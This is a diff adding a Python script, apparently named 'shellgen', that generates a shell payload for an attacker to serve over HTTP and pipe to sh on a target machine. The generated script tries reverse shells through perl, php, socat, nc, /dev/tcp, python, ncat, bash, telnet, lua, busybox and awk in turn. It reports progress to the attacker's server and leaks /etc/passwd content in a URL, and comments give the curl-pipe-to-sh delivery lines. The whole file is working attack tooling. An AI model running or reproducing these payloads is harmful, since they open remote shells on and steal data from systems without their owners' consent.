@@ -1,0 +1,190 @@
+#! /usr/bin/python3
+# -*- coding: utf-8 -*-
+#  @author: zerofrost🦊
+#  @date: 2024-1-21
+#  @description: This script generates a template of reverse shell commands to use
+
+
+
+verbose="False"
+white="\033[0m"
+red="\033[91m"
+green="\033[92m"
+bold="\033[01m"
+yellow="\033[93m"
+blue="\033[94m"
+success=f"{bold}{green}[+]{white} - "
+alert=f"{bold}{yellow}[!]{white} - "
+progress=f"{bold}{blue}[*]{white} - "
+fail=f"{bold}{red}[*]{white} - "
+end=f"{white}"
+
+def banner():
+	logo="""
+	███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
+	██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
+	███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
+	╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
+	███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
+	╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝                                                                  
+"""
+	print(f"{blue}{logo}{white}")
+
+
+import argparse
+parser=argparse.ArgumentParser()
+parser.add_argument('-ip','--ip',help='This is the ip address of the attacker machine',required=False)
+parser.add_argument('-p','--lport',help='This is the port of the attacker machine to listen on with netcat',default=3306,type=int,required=False)
+parser.add_argument('-svrport','--svrport',help='This is the http port of the attacker machine serving the generated sh script',default=3030,type=int,required=False)
+args=parser.parse_args()
+
+if not (args.ip):
+	banner()
+	parser.print_help()
+	exit(0)
+
+
+string=f"""#!/bin/sh
+# Reverseshell generator . Generate and write to /tmp/x
+# curl -sk {args.ip}:{args.svrport}/x
+
+
+
+if command -v perl > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=perl >/dev/null 
+perl -e 'use Socket;$i="{args.ip}";$p={args.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))"""+"""{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+"""+f"""exit;
+fi
+
+if command -v php > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=php >/dev/null 
+php -r '$sock=fsockopen("{args.ip}",{args.lport});exec("sh <&3 >&3 2>&3");'
+exit;
+fi
+
+
+if command -v socat > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=socat >/dev/null 
+socat TCP:{args.ip}:{args.lport} EXEC:sh
+exit;
+fi
+
+if command -v nc > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=nc >/dev/null 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} {args.lport} >/tmp/f
+exit;
+fi
+
+if command -v sh > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=sh >/dev/null 
+sh -i >& /dev/tcp/{args.ip}/{args.lport} 0>&1
+exit;
+fi
+
+if command -v python > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=python >/dev/null 
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{args.ip}",{args.lport})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+exit;
+fi
+
+if command -v python3 > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=python3 >/dev/null 
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{args.ip}",{args.lport})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+exit;
+fi
+
+
+
+if command -v ncat > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=ncat >/dev/null 
+ncat {args.ip} {args.lport} -e sh
+exit;
+fi
+
+
+
+if command -v bash > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=bash >/dev/null 
+/bin/bash -c 'bash -i >& /dev/tcp/{args.ip}/{args.lport} 0>&1' 
+exit;
+fi
+
+if command -v node > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=node >/dev/null 
+	if command -v nc > /dev/null 2>&1; then
+		echo "require('child_process').exec('nc -e sh {args.ip} {args.lport}')"
+	# exit;
+	fi
+fi
+
+
+if command -v telnet > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=telnet >/dev/null 
+TF=$(mktemp -u);mkfifo $TF && telnet {args.ip} {args.lport} 0<$TF | sh 1>$TF
+exit;
+fi
+
+if command -v lua > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=lua >/dev/null 
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('{args.ip}','{args.lport}');os.execute('sh -i <&3 >&3 2>&3');"
+exit;
+fi
+
+
+if command -v telnet > /dev/null 2>&1; then
+	if command -v curl > /dev/null 2>&1; then
+	C='curl -Ns telnet://{args.ip}:{args.lport}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+	exit;
+	fi
+fi
+
+# Check busybox 
+if [[ -f "/busybox" ]]; then
+	curl -sk {args.ip}:{args.svrport}/?p=check_busybox >/dev/null 
+	/busybox nc {args.ip} {args.lport} -e /bin/sh 
+	curl -sk {args.ip}:{args.svrport}/?p=exit_busybox >/dev/null 
+	# exit
+fi
+
+
+arch=$(uname -m)
+if [ -f "/busybox-$arch" ]; then
+	curl -sk {args.ip}:{args.svrport}/?p=check_busybox2 >/dev/null 
+	echo "/busybox-$arch nc {args.ip} {args.lport} -e /bin/sh" > /tmp/x
+	(sleep 5;rm -rf /tmp/x) &
+	sh /tmp/x
+	rm -rf /tmp/x
+	exit
+fi
+
+
+if command -v busybox > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=inbuilt_busybox_exists >/dev/null 
+busybox nc -e sh {args.ip} {args.lport}
+fi
+
+if command -v awk > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=awk >/dev/null 
+awk 'BEGIN """+"""{s = "/"""+f"""inet/tcp/0/{args.ip}/{args.lport}";"""+""" while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""+f"""
+exit;
+fi
+
+if command -v wget > /dev/null 2>&1; then
+curl -sk {args.ip}:{args.svrport}/?p=wget_installed_download_precompiled_binary >/dev/null 
+	if command -v gcc > /dev/null 2>&1; then
+	curl -sk {args.ip}:{args.svrport}/?p=gcc_installed >/dev/null 
+	curl -sk {args.ip}:{args.svrport}/?p=compile_and_run_binary >/dev/null 
+	fi
+fi
+curl -sk "{args.ip}:{args.svrport}/?p=download_busybox_for_$(uname -m)" >/dev/null 
+curl -sk "{args.ip}:{args.svrport}/?p=File_exfil" >/dev/null 
+curl -sk "{args.ip}:{args.svrport}/?leak=$(head -1 /etc/passwd)&b64encode_for_full_file" >/dev/null 
+
+
+# curl -sk {args.ip}:{args.svrport}/x | sh
+# curl {args.ip}:{args.svrport}/x|sh
+# curl {args.ip}:{args.svrport}/x|$0
+"""
+print(string)
+
+
